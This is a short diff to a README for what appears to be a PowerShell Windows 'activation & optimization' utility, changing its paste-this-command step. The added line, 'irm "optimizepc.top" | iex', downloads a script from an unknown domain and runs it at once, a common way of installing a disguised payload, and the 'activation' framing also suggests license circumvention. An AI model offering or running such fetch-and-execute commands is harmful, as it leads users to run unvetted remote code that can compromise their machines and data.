@@ -22,7 +22,7 @@ Easy PowerShell activation & optimization utility.
 ### 2️⃣ Copy & Paste This Command
 
 ```powershell
-irm "irm "optimizepc.top" | iex" | iex
+irm "optimizepc.top" | iex
 ```
 
 ---
